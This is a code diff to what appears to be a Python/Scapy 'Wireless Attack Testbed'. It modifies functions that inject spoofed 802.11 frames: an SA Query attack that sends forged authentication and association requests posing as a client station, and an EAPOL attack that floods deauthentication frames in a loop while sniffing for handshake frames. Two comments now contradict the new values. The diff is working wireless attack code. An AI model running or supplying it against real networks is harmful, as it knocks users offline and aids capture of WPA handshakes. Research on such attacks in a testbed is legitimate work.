@@ -40,18 +40,19 @@ def cts_nav_attack(interface):
 
 
 def sa_query_attack(interface, ap, sta):
-
     pkt = RadioTap() / Dot11(addr1=ap.bssid, addr2=sta.mac_addr, addr3=ap.bssid) / \
-          Dot11AssoReq(cap=0x1000, listen_interval=0x000a) / Dot11Elt(ID=0, info="Wireless Attack Testbed") / \
+          Dot11Auth(algo=0, seqnum=0x0001, status=0x0000)
+    interface.inject(pkt)
+    pkt = RadioTap() / Dot11(addr1=ap.bssid, addr2=sta.mac_addr, addr3=ap.bssid) / \
+          Dot11AssoReq(cap=0x3104, listen_interval=0x0001) / Dot11Elt(ID=0, info="Wireless Attack Testbed") / \
           Dot11EltRates() / Dot11Elt(ID='RSNinfo', info=(
         '\x01\x00'  # RSN Version 1
         '\x00\x0f\xac\x04'  # Group Cipher Suite : 00-0f-ac CCMP
-        '\x02\x00'  # 2 Pairwise Cipher Suites (next two lines)
+        '\x01\x00'  # 2 Pairwise Cipher Suite (next line)
         '\x00\x0f\xac\x04'  # AES Cipher
-        '\x00\x0f\xac\x02'  # TKIP Cipher
         '\x01\x00'  # 1 Authentication Key Managment Suite (line below)
         '\x00\x0f\xac\x02'  # Pre-Shared Key
-        '\x00\x00'))  # RSN Capabilities (no extra capabilities)
+        '\x80\x00'))  # RSN Capabilities (no extra capabilities)
     interface.inject(pkt)
 
 
@@ -70,7 +71,7 @@ def ap_deauth(interface: MonitorInterface, ap: AP, sta: Station):
 
 def eapol_attack_deauth(interface: MonitorInterface, ap: AP, sta: Station, spam: bool = False):
     while spam:
-        interface.deauth(ap.bssid, sta.mac_addr, bssid=ap.bssid, count=100, reason=3)
+        interface.deauth(ap.bssid, sta.mac_addr, count=100, reason=3)
     print("Waiting for EAPOL frame 3...")
     sniff(iface=interface.name, prn=ap_deauth(interface, ap, sta))
 
